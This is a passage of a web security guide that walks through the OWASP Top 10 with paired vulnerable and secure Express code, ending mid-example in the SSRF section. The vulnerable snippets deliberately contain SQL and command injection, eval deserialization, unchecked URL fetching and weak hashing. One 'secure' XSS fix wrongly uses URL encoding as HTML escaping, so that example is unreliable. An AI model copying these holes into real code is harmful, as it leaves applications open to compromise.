---
lastUpdatedOn: 2025-07-20
tags:
  - web-security
  - frontend
  - security
  - http-headers
  - csp
  - owasp
  - authentication
  - cryptography
  - injection
  - access-control
---

# Web Security Guide

Master web application security from OWASP Top 10 vulnerabilities to production implementation, covering authentication, authorization, input validation, and security headers for building secure applications.

## TLDR

**Web Security** is a comprehensive discipline encompassing OWASP Top 10 vulnerabilities, secure development practices, authentication systems, and defense-in-depth strategies for building resilient web applications.

### Foundational Security Principles

- **Secure SDLC**: Security integrated throughout development lifecycle (requirements, design, implementation, testing, deployment, maintenance)
- **Defense in Depth**: Multiple security layers (physical, network, application, data, monitoring)
- **Principle of Least Privilege**: Minimum necessary access rights for users, programs, and processes
- **Fail Securely**: Systems default to secure state during errors or failures

### OWASP Top 10 2021 Vulnerabilities

- **A01: Broken Access Control**: Unauthorized access, privilege escalation, IDOR vulnerabilities
- **A02: Cryptographic Failures**: Weak encryption, poor key management, insecure transmission
- **A03: Injection**: SQL injection, XSS, command injection, NoSQL injection
- **A04: Insecure Design**: Flaws in architecture, missing security controls, design weaknesses
- **A05: Security Misconfiguration**: Default configurations, exposed services, unnecessary features
- **A06: Vulnerable Components**: Outdated dependencies, known vulnerabilities, supply chain attacks
- **A07: Authentication Failures**: Weak authentication, session management, credential stuffing
- **A08: Software and Data Integrity**: Untrusted data sources, CI/CD vulnerabilities, insecure updates
- **A09: Security Logging Failures**: Insufficient logging, missing monitoring, inadequate incident response
- **A10: Server-Side Request Forgery**: SSRF attacks, unauthorized resource access, internal network exposure

### Security Architecture by Rendering Strategy

- **SSG Security**: Static file serving, reduced attack surface, CDN security, build-time validation
- **SSR Security**: Server-side vulnerabilities, session management, input validation, rate limiting
- **CSR Security**: Client-side security, XSS prevention, CSP implementation, secure APIs
- **Hybrid Security**: Multi-layer defense, edge security, authentication strategies

### Essential HTTP Security Headers

- **Content Security Policy (CSP)**: XSS prevention, resource restrictions, nonce/hash-based policies
- **Strict-Transport-Security (HSTS)**: HTTPS enforcement, secure cookie handling
- **X-Frame-Options**: Clickjacking prevention, frame embedding controls
- **X-Content-Type-Options**: MIME type sniffing prevention
- **Referrer-Policy**: Referrer information control, privacy protection
- **Permissions-Policy**: Feature policy enforcement, API access control

### Authentication and Session Security

- **Multi-Factor Authentication**: TOTP, SMS, hardware tokens, biometric authentication
- **OAuth 2.0/OpenID Connect**: Standardized authorization, JWT tokens, scope management
- **Session Management**: Secure session storage, session fixation prevention, timeout policies
- **Password Security**: Strong hashing (bcrypt, Argon2), password policies, breach detection

### Cryptographic Implementation

- **Encryption Standards**: AES-256, RSA-2048+, ECC curves, TLS 1.3
- **Key Management**: Hardware security modules, key rotation, secure key storage
- **Hash Functions**: SHA-256, bcrypt, Argon2, salt generation, pepper usage
- **Digital Signatures**: RSA signatures, ECDSA, certificate validation

### Input Validation and Output Encoding

- **Input Validation**: Whitelist validation, type checking, length limits, format validation
- **Output Encoding**: HTML encoding, URL encoding, JavaScript encoding, SQL escaping
- **Sanitization**: HTML sanitization, file upload validation, content filtering
- **Parameterized Queries**: Prepared statements, ORM usage, query parameterization

### Access Control and Authorization

- **Role-Based Access Control (RBAC)**: User roles, permission inheritance, role hierarchies
- **Attribute-Based Access Control (ABAC)**: Dynamic permissions, contextual access control
- **API Security**: Rate limiting, authentication, authorization, input validation
- **Resource Protection**: File access control, database permissions, service isolation

### Security Testing and Validation

- **Static Analysis**: Code scanning, dependency analysis, SAST tools
- **Dynamic Testing**: Penetration testing, vulnerability scanning, DAST tools
- **Security Audits**: Code reviews, architecture reviews, compliance assessments
- **Incident Response**: Security monitoring, alerting, incident handling, recovery procedures

### Implementation Best Practices

- **Secure Coding**: Input validation, output encoding, error handling, logging
- **Configuration Management**: Secure defaults, environment-specific configs, secrets management
- **Monitoring and Logging**: Security events, audit trails, real-time monitoring, alerting
- **Incident Response**: Detection, containment, eradication, recovery, lessons learned

## Table of Contents

1. [Foundational Security Principles](#foundational-security-principles)
2. [OWASP Top 10 2021 Deep Dive](#owasp-top-10-2021-deep-dive)
3. [Security Architecture by Rendering Strategy](#security-architecture-by-rendering-strategy)
4. [Essential HTTP Security Headers](#essential-http-security-headers)
5. [Content Security Policy Deep Dive](#content-security-policy-deep-dive)
6. [Authentication and Session Security](#authentication-and-session-security)
7. [Cryptographic Implementation](#cryptographic-implementation)
8. [Input Validation and Output Encoding](#input-validation-and-output-encoding)
9. [Access Control and Authorization](#access-control-and-authorization)
10. [Dependency and Supply Chain Security](#dependency-and-supply-chain-security)
11. [Security Logging and Monitoring](#security-logging-and-monitoring)
12. [Web Application Firewalls and DDoS Protection](#web-application-firewalls-and-ddos-protection)
13. [Implementation Best Practices](#implementation-best-practices)
14. [Security Testing and Validation](#security-testing-and-validation)
15. [Incident Response and Recovery](#incident-response-and-recovery)

## Foundational Security Principles

Before diving into specific vulnerabilities and mitigations, it's essential to understand the strategic principles that form the bedrock of robust security posture. These concepts are not isolated fixes but overarching philosophies that, when adopted, prevent entire classes of vulnerabilities from materializing.

### The Secure Software Development Lifecycle (SDLC)

Security is not a feature that can be bolted on at the end of development; it's a continuous discipline that must be integrated into every phase. The practice of embedding security throughout the entire software development process is known as a Secure Software Development Lifecycle (SDLC), often realized through a DevSecOps culture.

**Key SDLC Security Activities:**

- **Requirements Phase:** Security requirements gathering, threat modeling, risk assessment
- **Design Phase:** Security architecture review, secure design patterns, access control design
- **Implementation Phase:** Secure coding practices, code reviews, static analysis
- **Testing Phase:** Security testing, penetration testing, vulnerability assessment
- **Deployment Phase:** Secure configuration, environment hardening, security monitoring
- **Maintenance Phase:** Security updates, vulnerability management, incident response

**Implementation Example:**

```javascript
// Security-first development workflow
const securityWorkflow = {
  preCommit: ["npm audit", "eslint --config .eslintrc.security.js", "sonarqube-analysis"],
  preDeploy: ["dependency-scan", "container-scan", "infrastructure-scan"],
  postDeploy: ["security-monitoring", "vulnerability-scan", "penetration-test"],
}
```

### Defense in Depth

The principle of Defense in Depth, also known as layered security, is built on the premise that no single security control is infallible. Instead of relying on a single point of defense, this strategy employs multiple, redundant security measures organized in layers.

**Security Layers:**

1. **Physical Controls:** Data center security, hardware access controls
2. **Network Controls:** Firewalls, network segmentation, intrusion detection
3. **Application Controls:** Input validation, authentication, authorization
4. **Data Controls:** Encryption, data classification, access logging
5. **Monitoring Controls:** Security event monitoring, incident response

**Implementation Strategy:**

```javascript
// Defense in depth implementation
const securityLayers = {
  network: {
    firewall: "WAF + Network Firewall",
    segmentation: "VLANs, Security Groups",
    monitoring: "IDS/IPS, Network Monitoring",
  },
  application: {
    authentication: "Multi-factor, OAuth 2.0",
    authorization: "RBAC, ABAC",
    validation: "Input sanitization, Output encoding",
  },
  data: {
    encryption: "TLS 1.3, AES-256",
    classification: "PII, PHI, Financial",
    access: "Audit logging, Data loss prevention",
  },
}
```

### Principle of Least Privilege (PoLP)

The Principle of Least Privilege dictates that any user, program, or process should have only the minimum necessary access rights and permissions required to perform its specific, authorized function—and nothing more.

**Implementation Guidelines:**

- **User Access:** Role-based access control (RBAC) with minimal permissions
- **Service Accounts:** Dedicated accounts with specific, limited permissions
- **Network Access:** Firewall rules that deny by default, allow by exception
- **Data Access:** Database permissions limited to required operations only

**Code Example:**

```javascript
// Least privilege implementation
const userPermissions = {
  role: "user",
  permissions: ["read:own_profile", "update:own_profile", "read:public_content"],
  restrictions: ["no_admin_access", "no_data_export", "no_user_management"],
}

// Service account with minimal permissions
const serviceAccount = {
  name: "api-service",
  permissions: ["read:user_data", "write:audit_logs"],
  networkAccess: ["database:3306", "redis:6379"],
}
```

### Fail Securely

Systems should default to a secure state in the event of an error or failure, rather than exposing vulnerabilities. This principle applies to authentication, authorization, error handling, and system configuration.

**Implementation Examples:**

```javascript
// Secure error handling
const secureErrorHandler = (error, req, res) => {
  // Log the full error for debugging
  logger.error("Application error:", {
    error: error.message,
    stack: error.stack,
    user: req.user?.id,
    ip: req.ip,
    timestamp: new Date().toISOString(),
  })

  // Return generic error to user
  res.status(500).json({
    error: "An internal error occurred",
    requestId: req.id, // For tracking in logs
  })
}

// Secure authentication failure
const handleAuthFailure = (req, res) => {
  // Don't reveal which credential was wrong
  res.status(401).json({
    error: "Invalid credentials",
    remainingAttempts: req.session.remainingAttempts || 3,
  })
}
```

These foundational principles are deeply interconnected and mutually reinforcing. A Secure SDLC provides the process for building secure software. Within that process, the system's architecture should be designed with Defense in Depth philosophy. At every layer of that defense, the Principle of Least Privilege should be the default state of operation, and all systems should fail securely.

## OWASP Top 10 2021 Deep Dive

The OWASP Top 10 represents the most critical security risks to web applications, ranked by exploitability, detectability, and impact. Understanding and addressing these vulnerabilities is essential for building secure applications.

### A01:2021 - Broken Access Control

**Definition:** Failures in enforcing restrictions on what authenticated users are allowed to do.

**Impact:** Unauthorized access to sensitive data, privilege escalation, complete system compromise.

**Common Vulnerabilities:**

- **Insecure Direct Object References (IDOR):** Exposing internal object references without proper authorization
- **Missing Access Controls:** Failing to check permissions on API endpoints
- **Privilege Escalation:** Users accessing functionality beyond their role
- **Horizontal Access Control Failures:** Users accessing other users' data

**Vulnerable Code Example:**

```javascript
// VULNERABLE: No access control check
app.get("/api/users/:id/profile", (req, res) => {
  const userId = req.params.id
  const user = getUserById(userId) // No authorization check
  res.json(user)
})

// VULNERABLE: Missing role-based access control
app.post("/api/admin/users", (req, res) => {
  // No admin role verification
  const newUser = createUser(req.body)
  res.json(newUser)
})
```

**Secure Implementation:**

```javascript
// SECURE: Proper access control
app.get("/api/users/:id/profile", authenticateToken, (req, res) => {
  const userId = req.params.id
  const requestingUser = req.user

  // Check if user can access this profile
  if (requestingUser.id !== userId && requestingUser.role !== "admin") {
    return res.status(403).json({ error: "Access denied" })
  }

  const user = getUserById(userId)
  res.json(user)
})

// SECURE: Role-based access control
app.post("/api/admin/users", authenticateToken, requireRole("admin"), (req, res) => {
  const newUser = createUser(req.body)
  res.json(newUser)
})

// Middleware for role verification
const requireRole = (role) => {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: "Insufficient permissions" })
    }
    next()
  }
}
```

**Mitigation Strategies:**

1. **Deny by Default:** Implement a deny-by-default access control policy
2. **Centralized Access Control:** Use middleware or decorators for consistent enforcement
3. **Role-Based Access Control (RBAC):** Define clear roles and permissions
4. **Attribute-Based Access Control (ABAC):** Use fine-grained access control based on attributes
5. **Regular Auditing:** Monitor and log all access control decisions

### A02:2021 - Cryptographic Failures

**Definition:** Failures related to cryptography or lack thereof, often leading to sensitive data exposure.

**Impact:** Data breaches, credential theft, financial fraud, regulatory violations.

**Common Vulnerabilities:**

- **Weak Encryption Algorithms:** Using deprecated algorithms like MD5, SHA1, DES
- **Poor Key Management:** Hardcoded keys, weak key generation, improper key storage
- **Insecure Transmission:** Sending sensitive data over unencrypted channels
- **Weak Password Hashing:** Using fast hashing algorithms without proper salting

**Vulnerable Code Example:**

```javascript
// VULNERABLE: Weak password hashing
const crypto = require("crypto")

function hashPassword(password) {
  return crypto.createHash("md5").update(password).digest("hex") // MD5 is broken
}

// VULNERABLE: Hardcoded encryption key
const ENCRYPTION_KEY = "my-secret-key-123" // Never hardcode keys
const cipher = crypto.createCipher("aes-256-cbc", ENCRYPTION_KEY)
```

**Secure Implementation:**

```javascript
// SECURE: Strong password hashing with bcrypt
const bcrypt = require("bcrypt")

async function hashPassword(password) {
  const saltRounds = 12 // Cost factor
  return await bcrypt.hash(password, saltRounds)
}

async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash)
}

// SECURE: Proper encryption with environment variables
const crypto = require("crypto")

function encryptData(data) {
  const key = Buffer.from(process.env.ENCRYPTION_KEY, "hex")
  const iv = crypto.randomBytes(16)
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv)

  let encrypted = cipher.update(data, "utf8", "hex")
  encrypted += cipher.final("hex")
  const authTag = cipher.getAuthTag()

  return {
    encrypted,
    iv: iv.toString("hex"),
    authTag: authTag.toString("hex"),
  }
}

function decryptData(encryptedData, iv, authTag) {
  const key = Buffer.from(process.env.ENCRYPTION_KEY, "hex")
  const decipher = crypto.createDecipheriv("aes-256-gcm", key, Buffer.from(iv, "hex"))
  decipher.setAuthTag(Buffer.from(authTag, "hex"))

  let decrypted = decipher.update(encryptedData, "hex", "utf8")
  decrypted += decipher.final("utf8")

  return decrypted
}
```

**Mitigation Strategies:**

1. **Use Strong Algorithms:** AES-256-GCM for encryption, Argon2/bcrypt for password hashing
2. **Secure Key Management:** Use key management services (AWS KMS, Azure Key Vault)
3. **TLS 1.3:** Enforce HTTPS with modern TLS configurations
4. **Key Rotation:** Regularly rotate encryption keys
5. **Secure Random Generation:** Use cryptographically secure random number generators

### A03:2021 - Injection

**Definition:** Flaws that allow untrusted data to be sent to an interpreter as part of a command or query.

**Impact:** Data theft, system compromise, unauthorized access, data corruption.

**Types of Injection:**

1. **SQL Injection (SQLi)**
2. **Cross-Site Scripting (XSS)**
3. **Command Injection**
4. **LDAP Injection**
5. **NoSQL Injection**

**Vulnerable Code Example:**

```javascript
// VULNERABLE: SQL Injection
app.post("/api/users/search", (req, res) => {
  const query = req.body.query
  const sql = `SELECT * FROM users WHERE name LIKE '%${query}%'` // Direct string concatenation
  db.query(sql, (err, results) => {
    res.json(results)
  })
})

// VULNERABLE: XSS
app.get("/search", (req, res) => {
  const query = req.query.q
  res.send(`<h1>Search results for: ${query}</h1>`) // Direct HTML injection
})

// VULNERABLE: Command Injection
app.get("/ping", (req, res) => {
  const host = req.query.host
  const command = `ping -c 4 ${host}` // Direct command injection
  exec(command, (error, stdout) => {
    res.send(stdout)
  })
})
```

**Secure Implementation:**

```javascript
// SECURE: Parameterized queries
app.post("/api/users/search", (req, res) => {
  const query = req.body.query
  const sql = "SELECT * FROM users WHERE name LIKE ?"
  db.query(sql, [`%${query}%`], (err, results) => {
    res.json(results)
  })
})

// SECURE: Output encoding
app.get("/search", (req, res) => {
  const query = req.query.q
  const encodedQuery = encodeURIComponent(query)
  res.send(`<h1>Search results for: ${encodedQuery}</h1>`)
})

// SECURE: Input validation and safe execution
app.get("/ping", (req, res) => {
  const host = req.query.host

  // Validate host parameter
  if (!isValidHostname(host)) {
    return res.status(400).json({ error: "Invalid hostname" })
  }

  // Use safe execution without shell
  execFile("ping", ["-c", "4", host], (error, stdout) => {
    res.send(stdout)
  })
})

function isValidHostname(hostname) {
  const hostnameRegex = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/
  return hostnameRegex.test(hostname)
}
```

**Mitigation Strategies:**

1. **Parameterized Queries:** Use prepared statements for all database queries
2. **Input Validation:** Validate and sanitize all user input
3. **Output Encoding:** Encode output based on context (HTML, JavaScript, SQL)
4. **Escape Special Characters:** Use proper escaping mechanisms
5. **Use Safe APIs:** Avoid dangerous functions like `eval()`, `exec()`

### A04:2021 - Insecure Design

**Definition:** Flaws related to design and architectural weaknesses, requiring a focus on threat modeling.

**Impact:** Systemic vulnerabilities that cannot be fixed with simple code changes.

**Common Design Flaws:**

- **Missing Security Controls:** No authentication, authorization, or input validation
- **Flawed Business Logic:** Logic that can be exploited (e.g., race conditions)
- **Inadequate Rate Limiting:** No protection against brute force attacks
- **Poor Session Management:** Weak session handling and token management

**Vulnerable Design Example:**

```javascript
// VULNERABLE: No rate limiting on authentication
app.post("/api/login", (req, res) => {
  const { username, password } = req.body

  // No rate limiting - vulnerable to brute force
  if (validateCredentials(username, password)) {
    res.json({ token: generateToken(username) })
  } else {
    res.status(401).json({ error: "Invalid credentials" })
  }
})

// VULNERABLE: Race condition in account creation
app.post("/api/accounts", (req, res) => {
  const { email } = req.body

  // Race condition: multiple requests can create accounts with same email
  if (!accountExists(email)) {
    createAccount(email)
    res.json({ success: true })
  } else {
    res.status(400).json({ error: "Account already exists" })
  }
})
```

**Secure Design Implementation:**

```javascript
// SECURE: Rate limiting and proper authentication
const rateLimit = require("express-rate-limit")

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // limit each IP to 5 requests per windowMs
  message: "Too many login attempts, please try again later",
  standardHeaders: true,
  legacyHeaders: false,
})

app.post("/api/login", loginLimiter, async (req, res) => {
  const { username, password } = req.body

  try {
    const user = await validateCredentials(username, password)
    if (user) {
      const token = await generateSecureToken(user)
      res.json({ token })
    } else {
      res.status(401).json({ error: "Invalid credentials" })
    }
  } catch (error) {
    res.status(500).json({ error: "Authentication error" })
  }
})

// SECURE: Atomic operations with database constraints
app.post("/api/accounts", async (req, res) => {
  const { email } = req.body

  try {
    // Use database constraints to prevent duplicates
    const account = await createAccountWithConstraint(email)
    res.json({ success: true, account })
  } catch (error) {
    if (error.code === "DUPLICATE_EMAIL") {
      res.status(400).json({ error: "Account already exists" })
    } else {
      res.status(500).json({ error: "Account creation failed" })
    }
  }
})
```

**Mitigation Strategies:**

1. **Threat Modeling:** Identify and address threats during design phase
2. **Secure Design Patterns:** Use established security patterns
3. **Security Architecture Review:** Regular reviews of system architecture
4. **Business Logic Testing:** Test for logical vulnerabilities
5. **Defense in Depth:** Multiple layers of security controls

### A05:2021 - Security Misconfiguration

**Definition:** Missing or insecure configurations across the application stack.

**Impact:** Unauthorized access, data exposure, system compromise.

**Common Misconfigurations:**

- **Default Credentials:** Unchanged default usernames and passwords
- **Unnecessary Features:** Enabled debug modes, sample applications
- **Insecure Headers:** Missing or misconfigured security headers
- **Open Permissions:** Overly permissive file or database permissions

**Vulnerable Configuration Example:**

```javascript
// VULNERABLE: Insecure Express configuration
const express = require("express")
const app = express()

// Missing security middleware
app.use(express.json())
app.use(express.static("public"))

// No security headers
app.get("/", (req, res) => {
  res.send("Hello World")
})

// VULNERABLE: Debug mode in production
const config = {
  debug: true, // Should be false in production
  database: {
    host: "localhost",
    user: "root", // Default credentials
    password: "password", // Weak password
  },
}
```

**Secure Configuration Implementation:**

```javascript
// SECURE: Proper Express configuration with security middleware
const express = require("express")
const helmet = require("helmet")
const cors = require("cors")
const rateLimit = require("express-rate-limit")

const app = express()

// Security middleware
app.use(helmet())
app.use(
  cors({
    origin: process.env.ALLOWED_ORIGINS?.split(",") || ["http://localhost:3000"],
    credentials: true,
  }),
)

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
})
app.use(limiter)

// Body parsing with limits
app.use(express.json({ limit: "10mb" }))
app.use(express.urlencoded({ extended: true, limit: "10mb" }))

// Secure static file serving
app.use(
  express.static("public", {
    maxAge: "1h",
    etag: true,
  }),
)

// SECURE: Environment-based configuration
const config = {
  debug: process.env.NODE_ENV === "development",
  database: {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    ssl: process.env.NODE_ENV === "production",
  },
  security: {
    sessionSecret: process.env.SESSION_SECRET,
    jwtSecret: process.env.JWT_SECRET,
    bcryptRounds: 12,
  },
}
```

**Mitigation Strategies:**

1. **Security Headers:** Implement comprehensive security headers
2. **Environment Configuration:** Use environment variables for sensitive data
3. **Default Security:** Secure by default configurations
4. **Regular Auditing:** Automated security configuration checks
5. **Documentation:** Maintain security configuration documentation

### A06:2021 - Vulnerable and Outdated Components

**Definition:** Using components with known vulnerabilities or that are no longer maintained.

**Impact:** Exploitation of known vulnerabilities, system compromise, data breaches.

**Common Issues:**

- **Known Vulnerabilities:** Using libraries with published CVEs
- **Outdated Versions:** Not updating to security patches
- **Unused Dependencies:** Including unnecessary vulnerable components
- **Transitive Dependencies:** Vulnerabilities in dependencies of dependencies

**Vulnerable Dependency Example:**

```json
// VULNERABLE: package.json with outdated dependencies
{
  "dependencies": {
    "express": "4.16.4", // Outdated version with known vulnerabilities
    "lodash": "4.17.15", // Version with prototype pollution vulnerability
    "moment": "2.24.0" // Outdated version
  }
}
```

**Secure Dependency Management:**

```json
// SECURE: Updated package.json with security considerations
{
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "moment": "^2.29.4"
  },
  "devDependencies": {
    "npm-audit-resolver": "^4.0.0",
    "snyk": "^1.1000.0"
  },
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "security:check": "snyk test",
    "preinstall": "npm audit --audit-level moderate"
  }
}
```

**Automated Security Scanning:**

```javascript
// Security scanning in CI/CD pipeline
const securityChecks = {
  preCommit: ["npm audit --audit-level moderate", "snyk test --severity-threshold=high"],
  preDeploy: ["npm audit --audit-level high", "snyk monitor", "container-scan"],
  postDeploy: ["vulnerability-scan", "dependency-monitoring"],
}
```

**Mitigation Strategies:**

1. **Automated Scanning:** Regular vulnerability scanning with tools like Snyk, npm audit
2. **Dependency Management:** Use lockfiles and pin versions
3. **Update Strategy:** Regular security updates and patch management
4. **Component Inventory:** Maintain Software Bill of Materials (SBOM)
5. **Vendor Monitoring:** Monitor security advisories from component vendors

### A07:2021 - Identification and Authentication Failures

**Definition:** Incorrect implementation of functions related to user identity, authentication, and session management.

**Impact:** Account takeover, unauthorized access, session hijacking.

**Common Failures:**

- **Weak Passwords:** Easily guessable or common passwords
- **No Rate Limiting:** Unlimited login attempts
- **Session Management Issues:** Weak session tokens, improper session handling
- **Multi-Factor Authentication:** Missing or improperly implemented MFA

**Vulnerable Authentication Example:**

```javascript
// VULNERABLE: Weak authentication implementation
app.post("/api/login", (req, res) => {
  const { username, password } = req.body

  // No rate limiting
  // No password complexity requirements
  // Weak session management

  if (username === "admin" && password === "password") {
    const sessionId = Math.random().toString(36) // Weak session ID
    res.json({ sessionId })
  } else {
    res.status(401).json({ error: "Invalid credentials" })
  }
})

// VULNERABLE: No session validation
app.get("/api/profile", (req, res) => {
  const sessionId = req.headers["session-id"]
  // No session validation or expiration check
  res.json({ user: getUserBySession(sessionId) })
})
```

**Secure Authentication Implementation:**

```javascript
// SECURE: Comprehensive authentication system
const bcrypt = require("bcrypt")
const jwt = require("jsonwebtoken")
const rateLimit = require("express-rate-limit")

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: "Too many login attempts",
})

app.post("/api/login", loginLimiter, async (req, res) => {
  const { username, password } = req.body

  try {
    const user = await getUserByUsername(username)
    if (!user) {
      return res.status(401).json({ error: "Invalid credentials" })
    }

    const isValidPassword = await bcrypt.compare(password, user.passwordHash)
    if (!isValidPassword) {
      return res.status(401).json({ error: "Invalid credentials" })
    }

    // Generate secure JWT token
    const token = jwt.sign({ userId: user.id, role: user.role }, process.env.JWT_SECRET, { expiresIn: "15m" })

    // Set secure HTTP-only cookie
    res.cookie("session", token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "strict",
      maxAge: 15 * 60 * 1000, // 15 minutes
    })

    res.json({ success: true })
  } catch (error) {
    res.status(500).json({ error: "Authentication error" })
  }
})

// SECURE: JWT middleware for protected routes
const authenticateToken = (req, res, next) => {
  const token = req.cookies.session || req.headers["authorization"]?.split(" ")[1]

  if (!token) {
    return res.status(401).json({ error: "Access token required" })
  }

  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: "Invalid token" })
    }
    req.user = user
    next()
  })
}

app.get("/api/profile", authenticateToken, (req, res) => {
  const user = getUserById(req.user.userId)
  res.json({ user })
})
```

**Mitigation Strategies:**

1. **Strong Password Policies:** Enforce complex password requirements
2. **Multi-Factor Authentication:** Implement MFA for sensitive operations
3. **Rate Limiting:** Limit login attempts and API calls
4. **Secure Session Management:** Use secure session tokens and proper expiration
5. **Password Hashing:** Use strong hashing algorithms with salt

### A08:2021 - Software and Data Integrity Failures

**Definition:** Failures related to software updates, critical data, and CI/CD pipelines without verifying integrity.

**Impact:** Supply chain attacks, malicious code execution, data tampering.

**Common Failures:**

- **Unsigned Software Updates:** Installing updates without digital signatures
- **Compromised CI/CD Pipelines:** Malicious code injection in build processes
- **Insecure Deserialization:** Processing untrusted serialized data
- **Dependency Hijacking:** Malicious packages in dependency chains

**Vulnerable Integrity Example:**

```javascript
// VULNERABLE: Unsigned software updates
app.post("/api/update", (req, res) => {
  const updateUrl = req.body.updateUrl

  // Download and install update without verification
  downloadFile(updateUrl, (err, file) => {
    if (!err) {
      installUpdate(file) // No signature verification
      res.json({ success: true })
    }
  })
})

// VULNERABLE: Insecure deserialization
app.post("/api/data", (req, res) => {
  const serializedData = req.body.data

  // Dangerous deserialization without validation
  const data = eval("(" + serializedData + ")") // Never use eval
  res.json(data)
})
```

**Secure Integrity Implementation:**

```javascript
// SECURE: Signed software updates with verification
const crypto = require("crypto")

app.post("/api/update", async (req, res) => {
  const { updateUrl, signature, expectedHash } = req.body

  try {
    // Download update
    const updateFile = await downloadFile(updateUrl)

    // Verify signature
    const publicKey = fs.readFileSync("update-public-key.pem")
    const signatureValid = crypto.verify("sha256", updateFile, publicKey, Buffer.from(signature, "base64"))

    if (!signatureValid) {
      return res.status(400).json({ error: "Invalid signature" })
    }

    // Verify hash
    const fileHash = crypto.createHash("sha256").update(updateFile).digest("hex")
    if (fileHash !== expectedHash) {
      return res.status(400).json({ error: "Hash mismatch" })
    }

    // Install verified update
    await installUpdate(updateFile)
    res.json({ success: true })
  } catch (error) {
    res.status(500).json({ error: "Update failed" })
  }
})

// SECURE: Safe deserialization
app.post("/api/data", (req, res) => {
  const jsonData = req.body.data

  try {
    // Use JSON.parse instead of eval
    const data = JSON.parse(jsonData)

    // Validate data structure
    if (!isValidDataStructure(data)) {
      return res.status(400).json({ error: "Invalid data structure" })
    }

    res.json(data)
  } catch (error) {
    res.status(400).json({ error: "Invalid JSON" })
  }
})

function isValidDataStructure(data) {
  // Implement validation logic
  return typeof data === "object" && data !== null
}
```

**Mitigation Strategies:**

1. **Digital Signatures:** Verify all software updates and packages
2. **Secure CI/CD:** Implement secure build and deployment pipelines
3. **Safe Deserialization:** Use safe serialization formats and validation
4. **Dependency Verification:** Verify package integrity and sources
5. **Code Signing:** Sign all production code and artifacts

### A09:2021 - Security Logging and Monitoring Failures

**Definition:** Insufficient logging and monitoring, coupled with a lack of incident response.

**Impact:** Undetected attacks, delayed incident response, compliance violations.

**Common Failures:**

- **Insufficient Logging:** Not logging critical security events
- **Poor Log Quality:** Incomplete or inaccurate log data
- **No Monitoring:** Lack of real-time security monitoring
- **Missing Incident Response:** No plan for security incidents

**Vulnerable Logging Example:**

```javascript
// VULNERABLE: Insufficient logging
app.post("/api/login", (req, res) => {
  const { username, password } = req.body

  if (validateCredentials(username, password)) {
    res.json({ success: true })
    // No logging of successful login
  } else {
    res.status(401).json({ error: "Invalid credentials" })
    // No logging of failed login attempt
  }
})

// VULNERABLE: Sensitive data in logs
app.post("/api/users", (req, res) => {
  const userData = req.body

  console.log("Creating user:", userData) // Logs sensitive data
  createUser(userData)
  res.json({ success: true })
})
```

**Secure Logging Implementation:**

```javascript
// SECURE: Comprehensive security logging
const winston = require("winston")

const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(winston.format.timestamp(), winston.format.json()),
  transports: [new winston.transports.File({ filename: "security.log" }), new winston.transports.Console()],
})

app.post("/api/login", (req, res) => {
  const { username, password } = req.body
  const clientIP = req.ip
  const userAgent = req.get("User-Agent")

  try {
    if (validateCredentials(username, password)) {
      // Log successful login
      logger.info("Successful login", {
        username,
        ip: clientIP,
        userAgent,
        timestamp: new Date().toISOString(),
      })

      res.json({ success: true })
    } else {
      // Log failed login attempt
      logger.warn("Failed login attempt", {
        username,
        ip: clientIP,
        userAgent,
        timestamp: new Date().toISOString(),
      })

      res.status(401).json({ error: "Invalid credentials" })
    }
  } catch (error) {
    logger.error("Login error", {
      username,
      ip: clientIP,
      error: error.message,
      timestamp: new Date().toISOString(),
    })

    res.status(500).json({ error: "Authentication error" })
  }
})

// SECURE: Sanitized logging
app.post("/api/users", (req, res) => {
  const userData = req.body

  // Log without sensitive data
  logger.info("Creating user", {
    username: userData.username,
    email: userData.email,
    timestamp: new Date().toISOString(),
    // Don't log password or other sensitive fields
  })

  createUser(userData)
  res.json({ success: true })
})

// Security monitoring middleware
const securityMonitor = (req, res, next) => {
  const startTime = Date.now()

  res.on("finish", () => {
    const duration = Date.now() - startTime

    // Log suspicious activities
    if (res.statusCode === 401 || res.statusCode === 403) {
      logger.warn("Access denied", {
        method: req.method,
        url: req.url,
        ip: req.ip,
        statusCode: res.statusCode,
        duration,
        timestamp: new Date().toISOString(),
      })
    }

    // Log slow requests
    if (duration > 5000) {
      logger.warn("Slow request", {
        method: req.method,
        url: req.url,
        duration,
        timestamp: new Date().toISOString(),
      })
    }
  })

  next()
}

app.use(securityMonitor)
```

**Mitigation Strategies:**

1. **Comprehensive Logging:** Log all security-relevant events
2. **Log Protection:** Secure log storage and access controls
3. **Real-time Monitoring:** Implement security event monitoring
4. **Incident Response:** Develop and test incident response plans
5. **Log Analysis:** Use SIEM tools for log analysis and correlation

### A10:2021 - Server-Side Request Forgery (SSRF)

**Definition:** Flaws that allow an attacker to induce a server-side application to make requests to an unintended location.

**Impact:** Internal network access, cloud metadata exposure, data exfiltration.

**Common SSRF Vectors:**

- **URL Fetching:** Applications that fetch URLs provided by users
- **Webhooks:** User-controlled webhook URLs
- **File Uploads:** Processing files from user-provided URLs
- **API Proxies:** Proxying requests to user-specified endpoints

**Vulnerable SSRF Example:**

```javascript
// VULNERABLE: Unvalidated URL fetching
app.get("/api/fetch", (req, res) => {
  const url = req.query.url

  // No validation of the URL
  fetch(url)
    .then((response) => response.text())
    .then((data) => res.send(data))
    .catch((error) => res.status(500).send("Error"))
})

// VULNERABLE: Webhook with user-controlled URL
app.post("/api/webhook", (req, res) => {
  const { url, data } = req.body

  // No validation of webhook URL
  fetch(url, {
    method: "POST",
    body: JSON.stringify(data),
    headers: { "Content-Type": "application/json" },
